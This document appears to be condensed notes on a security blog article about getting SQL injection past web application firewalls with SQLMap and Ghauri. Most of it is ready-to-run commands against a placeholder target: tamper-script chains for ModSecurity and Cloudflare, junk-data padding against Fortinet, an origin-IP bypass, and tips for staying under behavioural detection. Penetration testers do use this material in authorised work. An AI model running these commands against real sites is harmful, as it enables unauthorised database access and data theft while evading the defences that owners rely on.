# : Mastering SQLMap and Ghauri — WAF Bypass Techniques
- Source: (Jan 15, 2026) — infosecwriteups.com
- Complete WAF bypass for SQL injection using both tools together

## SQL Injection Still Matters in 2026
- WAFs, ORMs, and secure coding frameworks improved, but legacy code and misconfigured APIs still expose injection points
- Using both SQLmap AND Ghauri together provides strongest coverage

## SQLmap WAF Bypass & Evasion Techniques

### Ignore Block
```bash
sqlmap -u "https://target.com/page?id=1" --ignore-code 403
```

### ModSecurity WAF Bypass
```bash
sqlmap -u "https://target.com/page?id=1" \
  --tamper=between,randomcase,space2comment \
  --random-agent --delay=2
```

### Cloudflare WAF Bypass
```bash
sqlmap -u "https://target.com/page?id=1" \
  --tamper=between,bluecoat,charencode,charunicodeencode \
  --random-agent --delay=2 --flush-session
```

### Origin IP Bypass (Bypassing WAF entirely)
```bash
# Find origin IP via Shodan/Censys/CT logs
sqlmap -u "http://ORIGIN_IP/page?id=1" \
  -H "Host: target.com"
```

## Ghauri — Next-Gen SQLi for WAF-Hardened Targets
- Optimized for blind, time-based, and WAF-protected targets
- Effective against JavaScript-heavy apps, REST APIs, cloud WAFs
- Adapts inference techniques to look like normal traffic

### Ghauri WAF Bypass Commands
```bash
# Fortinet WAF bypass with junk data overload
ghauri -u "https://target.com/page?id=1" \
  --junkdata --skip-urlencode

# Generic WAF with random case + delay
ghauri -u "https://target.com/page?id=1" \
  --random-agent --delay=2 --skip-waf

# Terminate trailing query to break WAF inspection
ghauri -u "https://target.com/page?id=1" \
  --terminate --skip-urlencode --confirm
```

### WAF Inspection Limits You Can Abuse
- Inject large volumes of junk data to exceed WAF inspection size
- WAFs often truncate or skip inspection on oversized payloads
```bash
ghauri -u "https://target.com/page?id=1" \
  --junkdata --skip-urlencode --time-sec=10
```

## Ghauri vs SQLMap: WAF Bypass Showdown

| Technique | SQLmap | Ghauri |
|-----------|--------|--------|
| Between | --tamper=between | Built-in |
| Random Case | --tamper=randomcase | --random-agent |
| Space2Comment | --tamper=space2comment | Built-in |
| Junk Data Overload | No native support | --junkdata |
| Skip URL Encode | --skip-urlencode | --skip-urlencode |
| Origin IP Bypass | Manual | Manual |

## Key Tips
- Always test with BOTH tools — SQLmap may find what Ghauri misses and vice versa
- Origin IP bypass is the most effective technique (bypasses ALL WAF rules)
- Junk data injection works especially well against Fortinet WAF
- Use delay/rate limiting to avoid triggering behavioral WAF analysis
- WAF bypass is a layered approach — try multiple techniques in combination
